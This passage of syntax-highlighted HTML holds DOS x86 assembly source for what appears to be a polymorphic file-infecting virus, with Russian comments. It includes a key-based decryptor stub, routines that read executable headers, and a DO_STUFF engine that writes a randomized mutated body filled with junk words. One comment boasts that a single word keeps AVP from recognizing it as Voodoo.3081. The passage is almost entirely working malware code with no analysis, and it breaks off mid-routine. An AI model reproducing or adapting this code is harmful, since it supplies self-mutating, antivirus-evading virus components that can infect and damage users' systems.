</span><span class="sc5">seekF0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; seek(f,0)</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">handleR</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seekf</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------</span><span class="sc0">
</span><span class="sc5">read_heder</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;bx=handel</span><span class="sc0">
             </span><span class="sc1">;CX=number of byte to read</span><span class="sc0">
             </span><span class="sc1">;DS:DX BUFFER</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">handLER</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">readf</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">z</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc5">add_c</span><span class="sc0">   </span><span class="sc1">;для адресации переменных</span><span class="sc0">
</span><span class="sc5">nachalo_shiphrovki</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9090H</span><span class="sc0">  </span><span class="sc1">; без еного Avp неопознает его как Voodoo.3081 :)</span><span class="sc0">
</span><span class="sc5">deshiphr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">c000</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">; 2            ;1</span><span class="sc0">
          </span><span class="sc5">c001</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">; 2            ;2</span><span class="sc0">
          </span><span class="sc5">c1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; 12           ;3 \\100 byte</span><span class="sc0">
          </span><span class="sc5">c1_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc5">c1_key</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc5">c1_ret</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc5">oldIP__</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc5">oldcs__</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                 </span><span class="sc1">;4             ;4 \110</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fch</span><span class="sc0">
         </span><span class="sc5">c01_c</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                 </span><span class="sc1">;3            ;5 \120</span><span class="sc0">
         </span><span class="sc5">c2_c</span><span class="sc0">  </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c3</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                </span><span class="sc1">;3             ;6 \130</span><span class="sc0">
         </span><span class="sc5">c3_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c4</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;3             ;7  \140</span><span class="sc0">
         </span><span class="sc5">c4_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c5</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">;3             ;8  \150</span><span class="sc0">
         </span><span class="sc5">c5_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                   </span><span class="sc1">;             ;9  \160</span><span class="sc0">
         </span><span class="sc5">c6</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">;3             ;10  \170</span><span class="sc0">
         </span><span class="sc5">c6_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c7</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">;3             ;11  \180</span><span class="sc0">
         </span><span class="sc5">c7_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c8</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b9h</span><span class="sc0">                  </span><span class="sc1">;5             ;12  \190</span><span class="sc0">
         </span><span class="sc5">c8_size</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">;mov_ cx_,size;</span><span class="sc0">
         </span><span class="sc5">c8_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c9_</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">;4             ;13  \200</span><span class="sc0">
         </span><span class="sc5">c9_c_</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c9</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0243</span><span class="sc0">             </span><span class="sc1">;6              ;14_210</span><span class="sc0">
         </span><span class="sc5">c9_c</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c10</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;5        load key;15 \220</span><span class="sc0">
         </span><span class="sc5">c10_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c11</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;4                    ;16 \230</span><span class="sc0">
         </span><span class="sc5">c11_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c12</span><span class="sc4">:</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;4                 ;17  \240</span><span class="sc0">
         </span><span class="sc5">c12_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c13</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;4                 ;18  \250</span><span class="sc0">
         </span><span class="sc5">c13_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c14</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;4                   ;19  \260</span><span class="sc0">
         </span><span class="sc5">c14_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c15</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                </span><span class="sc1">;4                    ;20  \270</span><span class="sc0">
               </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c15_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c16</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">204</span><span class="sc0">            </span><span class="sc1">;4                     ;21 \280</span><span class="sc0">
         </span><span class="sc5">c16_c</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">c17</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">ptrs</span><span class="sc0">                                          </span><span class="sc1">;272 bytes</span><span class="sc0">
</span><span class="sc5">count00</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">count01</span><span class="sc4">:</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">R</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">rand_count00</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">count00</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">trans</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">R</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">STUFF_SIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">R</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">DO_STUFF</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stuff</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc1">;---------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stuff</span><span class="sc4">-</span><span class="sc5">add_c</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc1">;-----------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">300</span><span class="sc0">
</span><span class="sc5">DoEEE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">DoEEE</span><span class="sc0">
         </span><span class="sc1">;-----------</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc1">;-------------------</span><span class="sc0">
        </span><span class="sc1">;  s01</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; es:di&lt;--ds:si</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc1">; s02</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; es:di&lt;--ds:si</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">; s03</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; es:di&lt;--ds:si</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">; s04</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; es:di&lt;--ds:si</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">MorphSize</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">; s05</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; es:di&lt;--ds:si</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc1">;-----s1------------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">;----s2----------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">;----s3----------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">;---s4-------------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">;---s5--------------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">;---s6----------------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">;for JE</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc1">;-----tryagany---------------</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">;for jz ,jnz</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
